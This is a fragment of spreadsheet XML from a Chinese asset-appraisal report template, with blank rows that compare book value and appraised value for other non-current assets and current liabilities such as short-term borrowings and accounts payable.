      <c r="L14" s="156" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="578" t="n"/>
      <c r="E15" s="564" t="n"/>
      <c r="F15" s="564" t="n"/>
      <c r="G15" s="555">
        <f>F15-E15</f>
        <v/>
      </c>
      <c r="H15" s="615">
        <f>IF(E15=0,"",G15/E15*100)</f>
        <v/>
      </c>
      <c r="I15" s="383" t="n"/>
      <c r="J15" s="347" t="n"/>
      <c r="K15" s="347" t="n"/>
      <c r="L15" s="156" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="578" t="n"/>
      <c r="E16" s="564" t="n"/>
      <c r="F16" s="564" t="n"/>
      <c r="G16" s="555">
        <f>F16-E16</f>
        <v/>
      </c>
      <c r="H16" s="615">
        <f>IF(E16=0,"",G16/E16*100)</f>
        <v/>
      </c>
      <c r="I16" s="383" t="n"/>
      <c r="J16" s="347" t="n"/>
      <c r="K16" s="347" t="n"/>
      <c r="L16" s="156" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="578" t="n"/>
      <c r="E17" s="564" t="n"/>
      <c r="F17" s="564" t="n"/>
      <c r="G17" s="555">
        <f>F17-E17</f>
        <v/>
      </c>
      <c r="H17" s="615">
        <f>IF(E17=0,"",G17/E17*100)</f>
        <v/>
      </c>
      <c r="I17" s="383" t="n"/>
      <c r="J17" s="347" t="n"/>
      <c r="K17" s="347" t="n"/>
      <c r="L17" s="156" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="578" t="n"/>
      <c r="E18" s="564" t="n"/>
      <c r="F18" s="564" t="n"/>
      <c r="G18" s="555">
        <f>F18-E18</f>
        <v/>
      </c>
      <c r="H18" s="615">
        <f>IF(E18=0,"",G18/E18*100)</f>
        <v/>
      </c>
      <c r="I18" s="383" t="n"/>
      <c r="J18" s="347" t="n"/>
      <c r="K18" s="347" t="n"/>
      <c r="L18" s="156" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="578" t="n"/>
      <c r="E19" s="564" t="n"/>
      <c r="F19" s="564" t="n"/>
      <c r="G19" s="555">
        <f>F19-E19</f>
        <v/>
      </c>
      <c r="H19" s="615">
        <f>IF(E19=0,"",G19/E19*100)</f>
        <v/>
      </c>
      <c r="I19" s="383" t="n"/>
      <c r="J19" s="347" t="n"/>
      <c r="K19" s="347" t="n"/>
      <c r="L19" s="156" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="578" t="n"/>
      <c r="E20" s="564" t="n"/>
      <c r="F20" s="564" t="n"/>
      <c r="G20" s="555">
        <f>F20-E20</f>
        <v/>
      </c>
      <c r="H20" s="615">
        <f>IF(E20=0,"",G20/E20*100)</f>
        <v/>
      </c>
      <c r="I20" s="383" t="n"/>
      <c r="J20" s="347" t="n"/>
      <c r="K20" s="347" t="n"/>
      <c r="L20" s="156" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="578" t="n"/>
      <c r="E21" s="564" t="n"/>
      <c r="F21" s="564" t="n"/>
      <c r="G21" s="555">
        <f>F21-E21</f>
        <v/>
      </c>
      <c r="H21" s="615">
        <f>IF(E21=0,"",G21/E21*100)</f>
        <v/>
      </c>
      <c r="I21" s="383" t="n"/>
      <c r="J21" s="347" t="n"/>
      <c r="K21" s="347" t="n"/>
      <c r="L21" s="156" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="578" t="n"/>
      <c r="E22" s="564" t="n"/>
      <c r="F22" s="564" t="n"/>
      <c r="G22" s="555">
        <f>F22-E22</f>
        <v/>
      </c>
      <c r="H22" s="615">
        <f>IF(E22=0,"",G22/E22*100)</f>
        <v/>
      </c>
      <c r="I22" s="383" t="n"/>
      <c r="J22" s="347" t="n"/>
      <c r="K22" s="347" t="n"/>
      <c r="L22" s="156" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="578" t="n"/>
      <c r="E23" s="564" t="n"/>
      <c r="F23" s="564" t="n"/>
      <c r="G23" s="555">
        <f>F23-E23</f>
        <v/>
      </c>
      <c r="H23" s="615">
        <f>IF(E23=0,"",G23/E23*100)</f>
        <v/>
      </c>
      <c r="I23" s="383" t="n"/>
      <c r="J23" s="347" t="n"/>
      <c r="K23" s="347" t="n"/>
      <c r="L23" s="156" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="578" t="n"/>
      <c r="E24" s="564" t="n"/>
      <c r="F24" s="564" t="n"/>
      <c r="G24" s="555">
        <f>F24-E24</f>
        <v/>
      </c>
      <c r="H24" s="615">
        <f>IF(E24=0,"",G24/E24*100)</f>
        <v/>
      </c>
      <c r="I24" s="383" t="n"/>
      <c r="J24" s="347" t="n"/>
      <c r="K24" s="347" t="n"/>
      <c r="L24" s="156" t="n"/>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="578" t="n"/>
      <c r="E25" s="564" t="n"/>
      <c r="F25" s="564" t="n"/>
      <c r="G25" s="555">
        <f>F25-E25</f>
        <v/>
      </c>
      <c r="H25" s="615">
        <f>IF(E25=0,"",G25/E25*100)</f>
        <v/>
      </c>
      <c r="I25" s="383" t="n"/>
      <c r="J25" s="347" t="n"/>
      <c r="K25" s="347" t="n"/>
      <c r="L25" s="156" t="n"/>
    </row>
    <row r="26" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="578" t="n"/>
      <c r="E26" s="564" t="n"/>
      <c r="F26" s="564" t="n"/>
      <c r="G26" s="555">
        <f>F26-E26</f>
        <v/>
      </c>
      <c r="H26" s="615">
        <f>IF(E26=0,"",G26/E26*100)</f>
        <v/>
      </c>
      <c r="I26" s="383" t="n"/>
      <c r="J26" s="347" t="n"/>
      <c r="K26" s="347" t="n"/>
      <c r="L26" s="156" t="n"/>
    </row>
    <row r="27" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="578" t="n"/>
      <c r="E27" s="564" t="n"/>
      <c r="F27" s="564" t="n"/>
      <c r="G27" s="555">
        <f>F27-E27</f>
        <v/>
      </c>
      <c r="H27" s="615">
        <f>IF(E27=0,"",G27/E27*100)</f>
        <v/>
      </c>
      <c r="I27" s="383" t="n"/>
      <c r="J27" s="347" t="n"/>
      <c r="K27" s="347" t="n"/>
      <c r="L27" s="156" t="n"/>
    </row>
    <row r="28" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B28" s="380" t="inlineStr">
        <is>
          <t>合                    计</t>
        </is>
      </c>
      <c r="C28" s="567" t="n"/>
      <c r="D28" s="115" t="n"/>
      <c r="E28" s="564">
        <f>ROUND(SUM(E6:E27),2)</f>
        <v/>
      </c>
      <c r="F28" s="564">
        <f>ROUND(SUM(F6:F27),2)</f>
        <v/>
      </c>
      <c r="G28" s="555">
        <f>F28-E28</f>
        <v/>
      </c>
      <c r="H28" s="615">
        <f>IF(E28=0,"",G28/E28*100)</f>
        <v/>
      </c>
      <c r="I28" s="383" t="n"/>
      <c r="J28" s="347" t="n"/>
      <c r="K28" s="347" t="n"/>
      <c r="L28" s="156" t="n"/>
    </row>
    <row r="29" s="415">
      <c r="A29" s="116" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="3">
    <mergeCell ref="B1:I1"/>
    <mergeCell ref="B2:I2"/>
    <mergeCell ref="B28:C28"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:I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7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 codeName="Sheet78">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:I28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9" customWidth="1" style="410" min="1" max="1"/>
    <col width="7.66666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="28.3333333333333" customWidth="1" style="410" min="3" max="3"/>
    <col width="11" customWidth="1" style="410" min="4" max="4"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="6" max="7"/>
    <col outlineLevel="1" width="9.16666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col width="17.3333333333333" customWidth="1" style="410" min="9" max="9"/>
    <col width="9" customWidth="1" style="410" min="1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其他非流动资产评估明细表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402" t="inlineStr">
        <is>
          <t>表4-18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内容或名称</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>取得日期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78" t="n"/>
      <c r="E6" s="555" t="n"/>
      <c r="F6" s="555" t="n"/>
      <c r="G6" s="555">
        <f>F6-E6</f>
        <v/>
      </c>
      <c r="H6" s="615">
        <f>IF(E6=0,"",G6/E6*100)</f>
        <v/>
      </c>
      <c r="I6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="578" t="n"/>
      <c r="E7" s="555" t="n"/>
      <c r="F7" s="555" t="n"/>
      <c r="G7" s="555">
        <f>F7-E7</f>
        <v/>
      </c>
      <c r="H7" s="615">
        <f>IF(E7=0,"",G7/E7*100)</f>
        <v/>
      </c>
      <c r="I7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="578" t="n"/>
      <c r="E8" s="555" t="n"/>
      <c r="F8" s="555" t="n"/>
      <c r="G8" s="555">
        <f>F8-E8</f>
        <v/>
      </c>
      <c r="H8" s="615">
        <f>IF(E8=0,"",G8/E8*100)</f>
        <v/>
      </c>
      <c r="I8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="578" t="n"/>
      <c r="E9" s="555" t="n"/>
      <c r="F9" s="555" t="n"/>
      <c r="G9" s="555">
        <f>F9-E9</f>
        <v/>
      </c>
      <c r="H9" s="615">
        <f>IF(E9=0,"",G9/E9*100)</f>
        <v/>
      </c>
      <c r="I9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="578" t="n"/>
      <c r="E10" s="555" t="n"/>
      <c r="F10" s="555" t="n"/>
      <c r="G10" s="555">
        <f>F10-E10</f>
        <v/>
      </c>
      <c r="H10" s="615">
        <f>IF(E10=0,"",G10/E10*100)</f>
        <v/>
      </c>
      <c r="I10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="578" t="n"/>
      <c r="E11" s="555" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="555">
        <f>F11-E11</f>
        <v/>
      </c>
      <c r="H11" s="615">
        <f>IF(E11=0,"",G11/E11*100)</f>
        <v/>
      </c>
      <c r="I11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="578" t="n"/>
      <c r="E12" s="555" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="555">
        <f>F12-E12</f>
        <v/>
      </c>
      <c r="H12" s="615">
        <f>IF(E12=0,"",G12/E12*100)</f>
        <v/>
      </c>
      <c r="I12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="578" t="n"/>
      <c r="E13" s="555" t="n"/>
      <c r="F13" s="555" t="n"/>
      <c r="G13" s="555">
        <f>F13-E13</f>
        <v/>
      </c>
      <c r="H13" s="615">
        <f>IF(E13=0,"",G13/E13*100)</f>
        <v/>
      </c>
      <c r="I13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="578" t="n"/>
      <c r="E14" s="555" t="n"/>
      <c r="F14" s="555" t="n"/>
      <c r="G14" s="555">
        <f>F14-E14</f>
        <v/>
      </c>
      <c r="H14" s="615">
        <f>IF(E14=0,"",G14/E14*100)</f>
        <v/>
      </c>
      <c r="I14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="578" t="n"/>
      <c r="E15" s="555" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555">
        <f>F15-E15</f>
        <v/>
      </c>
      <c r="H15" s="615">
        <f>IF(E15=0,"",G15/E15*100)</f>
        <v/>
      </c>
      <c r="I15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="578" t="n"/>
      <c r="E16" s="555" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555">
        <f>F16-E16</f>
        <v/>
      </c>
      <c r="H16" s="615">
        <f>IF(E16=0,"",G16/E16*100)</f>
        <v/>
      </c>
      <c r="I16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="578" t="n"/>
      <c r="E17" s="555" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555">
        <f>F17-E17</f>
        <v/>
      </c>
      <c r="H17" s="615">
        <f>IF(E17=0,"",G17/E17*100)</f>
        <v/>
      </c>
      <c r="I17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="578" t="n"/>
      <c r="E18" s="555" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555">
        <f>F18-E18</f>
        <v/>
      </c>
      <c r="H18" s="615">
        <f>IF(E18=0,"",G18/E18*100)</f>
        <v/>
      </c>
      <c r="I18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="578" t="n"/>
      <c r="E19" s="555" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555">
        <f>F19-E19</f>
        <v/>
      </c>
      <c r="H19" s="615">
        <f>IF(E19=0,"",G19/E19*100)</f>
        <v/>
      </c>
      <c r="I19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="578" t="n"/>
      <c r="E20" s="555" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555">
        <f>F20-E20</f>
        <v/>
      </c>
      <c r="H20" s="615">
        <f>IF(E20=0,"",G20/E20*100)</f>
        <v/>
      </c>
      <c r="I20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="578" t="n"/>
      <c r="E21" s="555" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555">
        <f>F21-E21</f>
        <v/>
      </c>
      <c r="H21" s="615">
        <f>IF(E21=0,"",G21/E21*100)</f>
        <v/>
      </c>
      <c r="I21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="578" t="n"/>
      <c r="E22" s="555" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555">
        <f>F22-E22</f>
        <v/>
      </c>
      <c r="H22" s="615">
        <f>IF(E22=0,"",G22/E22*100)</f>
        <v/>
      </c>
      <c r="I22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="578" t="n"/>
      <c r="E23" s="555" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="555">
        <f>F23-E23</f>
        <v/>
      </c>
      <c r="H23" s="615">
        <f>IF(E23=0,"",G23/E23*100)</f>
        <v/>
      </c>
      <c r="I23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="578" t="n"/>
      <c r="E24" s="555" t="n"/>
      <c r="F24" s="555" t="n"/>
      <c r="G24" s="555">
        <f>F24-E24</f>
        <v/>
      </c>
      <c r="H24" s="615">
        <f>IF(E24=0,"",G24/E24*100)</f>
        <v/>
      </c>
      <c r="I24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="578" t="n"/>
      <c r="E25" s="555" t="n"/>
      <c r="F25" s="555" t="n"/>
      <c r="G25" s="555">
        <f>F25-E25</f>
        <v/>
      </c>
      <c r="H25" s="615">
        <f>IF(E25=0,"",G25/E25*100)</f>
        <v/>
      </c>
      <c r="I25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="578" t="n"/>
      <c r="E26" s="555" t="n"/>
      <c r="F26" s="555" t="n"/>
      <c r="G26" s="555">
        <f>F26-E26</f>
        <v/>
      </c>
      <c r="H26" s="615">
        <f>IF(E26=0,"",G26/E26*100)</f>
        <v/>
      </c>
      <c r="I26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="578" t="n"/>
      <c r="E27" s="555" t="n"/>
      <c r="F27" s="555" t="n"/>
      <c r="G27" s="555">
        <f>F27-E27</f>
        <v/>
      </c>
      <c r="H27" s="615">
        <f>IF(E27=0,"",G27/E27*100)</f>
        <v/>
      </c>
      <c r="I27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B28" s="380" t="inlineStr">
        <is>
          <t>合                    计</t>
        </is>
      </c>
      <c r="C28" s="567" t="n"/>
      <c r="D28" s="115" t="n"/>
      <c r="E28" s="555">
        <f>SUM(E6:E27)</f>
        <v/>
      </c>
      <c r="F28" s="555">
        <f>SUM(F6:F27)</f>
        <v/>
      </c>
      <c r="G28" s="555">
        <f>F28-E28</f>
        <v/>
      </c>
      <c r="H28" s="615">
        <f>IF(E28=0,"",G28/E28*100)</f>
        <v/>
      </c>
      <c r="I28" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="B4:E4"/>
    <mergeCell ref="B1:I1"/>
    <mergeCell ref="B2:I2"/>
    <mergeCell ref="B28:C28"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:I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 codeName="Sheet79">
    <tabColor rgb="FFFFFF00"/>
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:L27"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScale="90" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="D13" sqref="D13"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="8.33333333333333" customWidth="1" style="410" min="2" max="2"/>
    <col hidden="1" width="8.33333333333333" customWidth="1" style="410" min="3" max="3"/>
    <col width="27.1666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="18.6666666666667" customWidth="1" style="410" min="5" max="8"/>
    <col width="9" customWidth="1" style="410" min="9" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>流动负债评估汇总表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
      <c r="I2" s="376" t="n"/>
      <c r="J2" s="376" t="n"/>
      <c r="K2" s="376" t="n"/>
    </row>
    <row r="3" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B3" s="547" t="n"/>
      <c r="C3" s="547" t="n"/>
      <c r="D3" s="547" t="n"/>
      <c r="E3" s="547" t="n"/>
      <c r="F3" s="547" t="n"/>
      <c r="G3" s="547" t="n"/>
      <c r="H3" s="548" t="inlineStr">
        <is>
          <t>表5</t>
        </is>
      </c>
      <c r="I3" s="376" t="n"/>
      <c r="J3" s="376" t="n"/>
      <c r="K3" s="376" t="n"/>
    </row>
    <row r="4" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B4" s="571">
        <f>'2-分类汇总'!B4</f>
        <v/>
      </c>
      <c r="C4" s="554" t="n"/>
      <c r="D4" s="554" t="n"/>
      <c r="E4" s="554" t="n"/>
      <c r="F4" s="376" t="n"/>
      <c r="G4" s="376" t="n"/>
      <c r="H4" s="402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
      <c r="I4" s="376" t="n"/>
      <c r="J4" s="376" t="n"/>
      <c r="K4" s="376" t="n"/>
    </row>
    <row r="5" ht="16.5" customFormat="1" customHeight="1" s="369">
      <c r="B5" s="284" t="inlineStr">
        <is>
          <t>编号</t>
        </is>
      </c>
      <c r="C5" s="323" t="inlineStr">
        <is>
          <t>项目编号</t>
        </is>
      </c>
      <c r="D5" s="284" t="inlineStr">
        <is>
          <t>科目名称</t>
        </is>
      </c>
      <c r="E5" s="552" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="F5" s="552" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="G5" s="618" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="H5" s="552" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="I5" s="344" t="n"/>
      <c r="J5" s="344" t="n"/>
      <c r="K5" s="344" t="n"/>
      <c r="L5" s="154" t="n"/>
    </row>
    <row r="6" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B6" s="284" t="inlineStr">
        <is>
          <t>5-1</t>
        </is>
      </c>
      <c r="C6" s="397" t="inlineStr">
        <is>
          <t>短期借款</t>
        </is>
      </c>
      <c r="D6" s="327" t="inlineStr">
        <is>
          <t>短期借款</t>
        </is>
      </c>
      <c r="E6" s="560">
        <f>'5-1短期借款'!J28</f>
        <v/>
      </c>
      <c r="F6" s="560">
        <f>'5-1短期借款'!K28</f>
        <v/>
      </c>
      <c r="G6" s="555">
        <f>F6-E6</f>
        <v/>
      </c>
      <c r="H6" s="615">
        <f>IF(E6=0,"",G6/E6*100)</f>
        <v/>
      </c>
      <c r="I6" s="347" t="n"/>
      <c r="J6" s="347" t="n"/>
      <c r="K6" s="347" t="n"/>
      <c r="L6" s="156" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B7" s="284" t="inlineStr">
        <is>
          <t>5-2</t>
        </is>
      </c>
      <c r="C7" s="397" t="inlineStr">
        <is>
          <t>交融负债</t>
        </is>
      </c>
      <c r="D7" s="157" t="inlineStr">
        <is>
          <t>交易性金融负债</t>
        </is>
      </c>
      <c r="E7" s="560">
        <f>'5-2交易性金融负债'!F29</f>
        <v/>
      </c>
      <c r="F7" s="560">
        <f>'5-2交易性金融负债'!G29</f>
        <v/>
      </c>
      <c r="G7" s="555">
        <f>F7-E7</f>
        <v/>
      </c>
      <c r="H7" s="615">
        <f>IF(E7=0,"",G7/E7*100)</f>
        <v/>
      </c>
      <c r="I7" s="347" t="n"/>
      <c r="J7" s="347" t="n"/>
      <c r="K7" s="347" t="n"/>
      <c r="L7" s="156" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B8" s="284" t="inlineStr">
        <is>
          <t>5-3</t>
        </is>
      </c>
      <c r="C8" s="397" t="inlineStr">
        <is>
          <t>衍金负债</t>
        </is>
      </c>
      <c r="D8" s="157" t="inlineStr">
        <is>
          <t>衍生金融负债</t>
        </is>
      </c>
      <c r="E8" s="560">
        <f>'5-3衍生金融负债'!G31</f>
        <v/>
      </c>
      <c r="F8" s="560">
        <f>'5-3衍生金融负债'!H31</f>
        <v/>
      </c>
      <c r="G8" s="555">
        <f>F8-E8</f>
        <v/>
      </c>
      <c r="H8" s="615">
        <f>IF(E8=0,"",G8/E8*100)</f>
        <v/>
      </c>
      <c r="I8" s="347" t="n"/>
      <c r="J8" s="347" t="n"/>
      <c r="K8" s="347" t="n"/>
      <c r="L8" s="156" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B9" s="284" t="inlineStr">
        <is>
          <t>5-4</t>
        </is>
      </c>
      <c r="C9" s="397" t="inlineStr">
        <is>
          <t>应付票据</t>
        </is>
      </c>
      <c r="D9" s="157" t="inlineStr">
        <is>
          <t>应付票据</t>
        </is>
      </c>
      <c r="E9" s="560">
        <f>'5-4应付票据'!G30</f>
        <v/>
      </c>
      <c r="F9" s="560">
        <f>'5-4应付票据'!H30</f>
        <v/>
      </c>
      <c r="G9" s="555">
        <f>F9-E9</f>
        <v/>
      </c>
      <c r="H9" s="615">
        <f>IF(E9=0,"",G9/E9*100)</f>
        <v/>
      </c>
      <c r="I9" s="347" t="n"/>
      <c r="J9" s="347" t="n"/>
      <c r="K9" s="347" t="n"/>
      <c r="L9" s="156" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B10" s="284" t="inlineStr">
        <is>
          <t>5-5</t>
        </is>
      </c>
      <c r="C10" s="397" t="inlineStr">
        <is>
          <t>应付账款</t>
        </is>
      </c>
      <c r="D10" s="157" t="inlineStr">
        <is>
          <t>应付账款</t>
        </is>
      </c>
      <c r="E10" s="560">
        <f>'5-5应付账款'!I28</f>
        <v/>
      </c>
      <c r="F10" s="560">
        <f>'5-5应付账款'!J28</f>
        <v/>
      </c>
      <c r="G10" s="555">
        <f>F10-E10</f>
        <v/>
      </c>
      <c r="H10" s="615">
